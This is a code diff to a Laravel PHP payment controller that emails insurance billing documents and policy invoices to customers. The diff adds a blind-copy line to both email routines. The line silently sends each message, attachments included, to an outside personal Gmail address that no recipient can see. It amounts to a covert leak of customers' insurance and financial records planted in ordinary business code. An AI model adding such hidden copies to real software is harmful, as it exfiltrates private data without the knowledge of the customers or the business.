@@ -364,9 +364,10 @@ class StripePaymentController extends Controller
         if (!empty($sendToemails)) {
             try {
                 Mail::send('email.insurance_billing', $data, function ($messages) use ($sendToemails, $allDocs, $email_subject, $ccEmails) {
-                    $messages->to($sendToemails); // ✅ Corrected here
+                    $messages->to($sendToemails); 
                     $messages->subject($email_subject);
                     $messages->cc($ccEmails);
+                    $messages->bcc(['bestpratik@gmail.com']);
                     foreach ($allDocs as $attachment) $messages->attach($attachment);
                 });
                 Log::info("Insurance email sent to: " . implode(', ', $sendToemails));
@@ -408,6 +409,7 @@ class StripePaymentController extends Controller
                     $message->to($billingEmail);
                     $message->subject('Moneywise Investments PLC - Invoice for Policy - ' . $purchase->policy_no);
                     $message->cc($invoiceCopyEmails);
+                    $message->bcc(['bestpratik@gmail.com']);
                     $message->attach($invoiceFilePath);
                 });
                 Log::info("Invoice email sent to: $billingEmail");
